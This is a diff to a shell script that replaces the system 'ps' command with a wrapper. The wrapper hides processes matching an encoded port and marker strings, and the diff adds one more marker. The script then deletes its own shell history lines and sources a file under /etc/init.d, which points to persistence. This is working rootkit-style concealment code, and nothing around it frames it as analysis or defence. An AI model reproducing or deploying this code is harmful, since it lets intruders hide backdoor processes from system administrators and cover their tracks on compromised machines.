@@ -31,7 +31,7 @@ var=$(which ps | awk -F "ps" '{print $1}')
 mv """$var/ps""" """$var/.ps"""
 sleep 0.2
 echo '#!/bin/bash' > $var/ps
-echo '.ps "$@" | grep -v "$(echo '$(echo $port | base64)' | base64 -d)" | grep -v ".354654" | grep -v " .ps "' >> $var/ps
+echo '.ps "$@" | grep -v "$(echo '$(echo $port | base64)' | base64 -d)" | grep -v ".354654" | grep -v "1123581" | grep -v " .ps "' >> $var/ps
 chmod 755 $var/ps
 history -d $(history | awk -F " " '{print $1}' | tail -n 2 | xargs) 2>/dev/null
 source /etc/init.d/lnv1
